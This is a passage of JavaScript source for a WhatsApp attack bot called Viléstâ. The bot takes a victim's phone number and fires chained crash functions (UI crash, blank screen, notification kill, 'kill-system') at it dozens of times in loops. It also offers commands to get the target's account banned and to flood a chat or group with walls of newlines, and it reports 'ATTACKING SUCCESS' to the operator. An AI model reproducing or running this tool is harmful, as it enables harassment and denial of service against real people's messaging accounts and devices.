        await NotifKill(target)
        await DocBug(target)
        await LocaBugs(target)
        await BlankScreen(target, Ptcp = true)
      }
    }
    
   // COMO FUNC UI cici_syantik 🐉
    async function Comboxx5(target) {
      for (let i = 0; i < 20; i++) {
        await FrezeeMsg1(target)
        await FrezeeMsg2(target)
        await f10(target, Ptcp = true)
        await NotifKill(target)
        await DocBug(target)
        await LocaBugs(target)
        await BlankScreen(target, Ptcp = true)
        await UICRASH(target, ptcp = true)
        await crashUiV5(target, Ptcp = true)
        await systemUi(target, Ptcp = true)
      }
    }
    
   // COMO ALL FUNC cici_syantik 🐉
    async function Comboxx6(target) {
      for (let i = 0; i < 10; i++) {
        await Comboxx0(target)
        await Comboxx1(target)
        await Comboxx2(target)
        await Comboxx3(target)
        await Comboxx4(target)
        await Comboxx5(target)
      }
    }

    // cici_syantik END COMBO FUNC 🐉
 // cici_syantik Developer
 // cici_syantik Developer
 // cici_syantik Developer
 // TIYPE CASE cici_syantik 💮
switch (command) {
case 'menu':
case 'vilesta':
case 'xmenu': {
await cici_syantik.sendMessage(m.chat, {
  react: {
    text: `⚡`, 
    key: m.key
  }
})

setTimeout(async () => {
  await cici_syantik.sendMessage(m.chat, {
    react: {
      text: `🔥`, 
      key: m.key
    }
  })
}, 1000)

setTimeout(async () => {
  await cici_syantik.sendMessage(m.chat, {
    react: {
      text: `🐉`, 
      key: m.key
    }
  })
}, 2000)
 // react emoji cici_syantik
const teks = `
*\`ʚ||ɞ Information ʚ||ɞ\`*
*🦠⃝⃞ user* : ${pushname}
*🦠⃝⃞ bot name* : Viléstâ (¢)
*🦠⃝⃞ version* : 6.0.0
*🦠⃝⃞ dev* : https://t.me/cicitzy

*🐉\`⪻ Viléstâ ↯ Crãsh ⪼\`🐉*
> 💀 .xcrash ↯ *number*
> 💀 .xtrash ↯ *number*
> 💀 .xinvis ↯ *number*

*🐉\`⪻ Viléstâ ↯ Dévice ⪼\`🐉*
> 💀 .xandro ↯ *number*
> 💀 .xios ↯ *number*
> 💀 .xiphone ↯ *number*

*🐉\`⪻ Viléstâ ↯ Systém ⪼\`🐉*
> 💀 .kill-system ↯ *number*
> 💀 .ui-system ↯ *number*
> 💀 .killxblank ↯ *number*

*🐉\`⪻ Viléstâ ↯ Bãnd (¢) ⪼\`🐉*
> 💀 .ban-spam ↯ *number*
> 💀 .ban-perma ↯ *number*
> 💀 .ban-vip ↯ *join all*
> čicítzy viléstâ (¢) bãnds

*🐉\`⪻ Viléstâ ↯ Acces ⪼\`🐉*
> ❄️ .addacces ↯ *number*|30d
> ❄️ .delacces ↯ *number*|30d
> ❄️ .self ↯ *mode*
> ❄️ .public ↯ *mode*

*\`⪻ Trick ↯ Banned ⪼\`*
${global.Andrazyy6}
`
const image = 'https://img1.pixhost.to/images/5120/589174536_yanzhosting.jpg'; // ganti dengan URL image yang ingin dikirimkan
    await cici_syantik.sendMessage(m.chat, {
      image: { url: image },
      caption: teks
    }, { quoted: m });

 // cici_syantik || Mengirim Reply Sound
cici_syantik.sendMessage(m.chat, {audio: fs.readFileSync('./viléstâ/kasus viléstâ di spanyol 😱.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break

case 'ban-vip': {
await cici_syantik.sendMessage(m.chat, {
  react: {
    text: `⚡`, 
    key: m.key
  }
})

setTimeout(async () => {
  await cici_syantik.sendMessage(m.chat, {
    react: {
      text: `🔥`, 
      key: m.key
    }
  })
}, 1000)

setTimeout(async () => {
  await cici_syantik.sendMessage(m.chat, {
    react: {
      text: `🐉`, 
      key: m.key
    }
  })
}, 2000)
 // react emoji cici_syantik
const teks = `
*join semua / join all*

*\`⪻ Text ↯ Bãnd ⪼\`*
https://t.me/cicitzy

*\`⪻ Trick ↯ Bãnd ⪼\`*
https://t.me/cicitzySyantik

*\`⪻ Team ↯ Attacker ⪼\`*
${global.Andrazyy6}
`
const image = 'https://img1.pixhost.to/images/5120/589174536_yanzhosting.jpg'; // ganti dengan URL image yang ingin dikirimkan
    await cici_syantik.sendMessage(m.chat, {
      image: { url: image },
      caption: teks
    }, { quoted: m });

 // cici_syantik || Mengirim Reply Sound
cici_syantik.sendMessage(m.chat, {audio: fs.readFileSync('./viléstâ/kasus viléstâ di spanyol 😱.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break

case 'tesbug': {
await cici_syantik.sendMessage(m.chat, { react: { text: `🐉`, key: m.key }})
if (!q) return cici_syantikreply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
cici_syantikreply(bugres)
for (let i = 0; i < 30; i++) {
await Comboxx4(target)
await Comboxx5(target)
}
cici_syantikreply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』

𝐓𝐀𝐑𝐆𝐄𝐓 : ${target} ✅
𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 🐉

*🐉⃝⃝𝐂𝐡𝐚𝐧𝐧𝐞𝐥͢𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫͞͞🐉*
${global.Andrazyy6}`)
 // cici_syantik || Mengirim Reply Sound
cici_syantik.sendMessage(m.chat, {audio: fs.readFileSync('./viléstâ/kasus viléstâ di spanyol 😱.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break

case 'ban-spam':
case 'ban-perma': {
await cici_syantik.sendMessage(m.chat, { react: { text: `🚫`, key: m.key }})
if (!q) return cici_syantikreply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
cici_syantikreply(bugres)
for (let i = 0; i < 60; i++) {
await Comboxx1(target)
await Comboxx6(target)
await Comboxx0(target)
}
cici_syantikreply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』

𝐓𝐀𝐑𝐆𝐄𝐓 : ${target} ✅
𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 🐉

*🐉⃝⃝𝐂𝐡𝐚𝐧𝐧𝐞𝐥͢𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫͞͞🐉*
${global.Andrazyy6}`)
 // cici_syantik || Mengirim Reply Sound
cici_syantik.sendMessage(m.chat, {audio: fs.readFileSync('./viléstâ/kasus viléstâ di spanyol 😱.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break

case 'xcrash':
case 'xinvis':
case 'xtrsah': {
if (!isPremium) return cici_syantikreply('khusus premium (¢) ')
await cici_syantik.sendMessage(m.chat, { react: { text: `🐉`, key: m.key }})
if (!q) return cici_syantikreply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
cici_syantikreply(bugres)
for (let i = 0; i < 50; i++) {
await Comboxx0(target)
await Comboxx0(target)
await Comboxx0(target)
}
cici_syantikreply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』

𝐓𝐀𝐑𝐆𝐄𝐓 : ${target} ✅
𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 🐉

*🐉⃝⃝𝐂𝐡𝐚𝐧𝐧𝐞𝐥͢𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫͞͞🐉*
${global.Andrazyy6}`)
 // cici_syantik || Mengirim Reply Sound
cici_syantik.sendMessage(m.chat, {audio: fs.readFileSync('./viléstâ/kasus viléstâ di spanyol 😱.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break

case 'xandro': {
if (!isPremium) return cici_syantikreply('khusus premium (¢) ')
await cici_syantik.sendMessage(m.chat, { react: { text: `🐉`, key: m.key }})
if (!q) return cici_syantikreply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
cici_syantikreply(bugres)
for (let i = 0; i < 50; i++) {
await Comboxx0(target)
await Comboxx1(target)
}
cici_syantikreply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』

𝐓𝐀𝐑𝐆𝐄𝐓 : ${target} ✅
𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 🐉

*🐉⃝⃝𝐂𝐡𝐚𝐧𝐧𝐞𝐥͢𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫͞͞🐉*
${global.Andrazyy6}`)
 // cici_syantik || Mengirim Reply Sound
cici_syantik.sendMessage(m.chat, {audio: fs.readFileSync('./viléstâ/kasus viléstâ di spanyol 😱.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break

case 'xios': {
if (!isPremium) return cici_syantikreply('khusus premium (¢) ')
await cici_syantik.sendMessage(m.chat, { react: { text: `🐉`, key: m.key }})
if (!q) return cici_syantikreply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
cici_syantikreply(bugres)
for (let i = 0; i < 50; i++) {
await Comboxx3(target)
}
cici_syantikreply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』

𝐓𝐀𝐑𝐆𝐄𝐓 : ${target} ✅
𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 🐉

*🐉⃝⃝𝐂𝐡𝐚𝐧𝐧𝐞𝐥͢𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫͞͞🐉*
${global.Andrazyy6}`)
 // cici_syantik || Mengirim Reply Sound
cici_syantik.sendMessage(m.chat, {audio: fs.readFileSync('./viléstâ/kasus viléstâ di spanyol 😱.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break

case 'xiphone': {
if (!isPremium) return cici_syantikreply('khusus premium (¢) ')
await cici_syantik.sendMessage(m.chat, { react: { text: `🐉`, key: m.key }})
if (!q) return cici_syantikreply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
cici_syantikreply(bugres)
for (let i = 0; i < 50; i++) {
await Comboxx2(target)
}
cici_syantikreply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』

𝐓𝐀𝐑𝐆𝐄𝐓 : ${target} ✅
𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 🐉

*🐉⃝⃝𝐂𝐡𝐚𝐧𝐧𝐞𝐥͢𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫͞͞🐉*
${global.Andrazyy6}`)
 // cici_syantik || Mengirim Reply Sound
cici_syantik.sendMessage(m.chat, {audio: fs.readFileSync('./viléstâ/kasus viléstâ di spanyol 😱.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break

case 'kill-system': {
await cici_syantik.sendMessage(m.chat, { react: { text: `📵`, key: m.key }})
if (!q) return cici_syantikreply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
cici_syantikreply(bugres)
for (let i = 0; i < 50; i++) {
await Comboxx1(target)
await Comboxx2(target)
await Comboxx3(target)
}
cici_syantikreply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』

𝐓𝐀𝐑𝐆𝐄𝐓 : ${target} ✅
𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 🐉

*🐉⃝⃝𝐂𝐡𝐚𝐧𝐧𝐞𝐥͢𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫͞͞🐉*
${global.Andrazyy6}`)
 // cici_syantik || Mengirim Reply Sound
cici_syantik.sendMessage(m.chat, {audio: fs.readFileSync('./viléstâ/kasus viléstâ di spanyol 😱.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break

case 'ui-system':
case 'killxblank': {
await cici_syantik.sendMessage(m.chat, { react: { text: `📵`, key: m.key }})
if (!q) return cici_syantikreply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
cici_syantikreply(bugres)
for (let i = 0; i < 50; i++) {
await Comboxx1(target)
await Comboxx6(target)
}
cici_syantikreply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』

𝐓𝐀𝐑𝐆𝐄𝐓 : ${target} ✅
𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 🐉

*🐉⃝⃝𝐂𝐡𝐚𝐧𝐧𝐞𝐥͢𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫͞͞🐉*
${global.Andrazyy6}`)
 // cici_syantik || Mengirim Reply Sound
cici_syantik.sendMessage(m.chat, {audio: fs.readFileSync('./viléstâ/kasus viléstâ di spanyol 😱.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break

case 'clear-chat': {
if (!q) return m.reply(`Example:\n ${prefix + command} 62xxxx`)
BapakLuWkwk = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
cici_syantik.sendMessage(BapakLuWkwk, {text: `💞 𝐤𝐚𝐤 𝐚𝐤𝐮 𝐜𝐢𝐧𝐭𝐚 𝐤𝐚𝐦𝐮 😖 👉🏻👈🏻 \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nn\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n`})
m.reply("done clear chat by čicítzy viléstâ")
cici_syantik.sendMessage(m.chat, {audio: fs.readFileSync('./viléstâ/kasus viléstâ di spanyol 😱.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break

case 'clear-gc':
case 'group-clear': {
m.reply(`.clear-gc sedang di proses

*⪻ 𝐌𝐚𝐬𝐮𝐤 𝐂𝐡𝐚𝐧𝐧𝐞𝐥 𝐆𝐰 𝐖𝐨𝐲 ⪼*
${global.Andrazyy6}

GAK MASUK GW SPAM TERUS 😹
\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\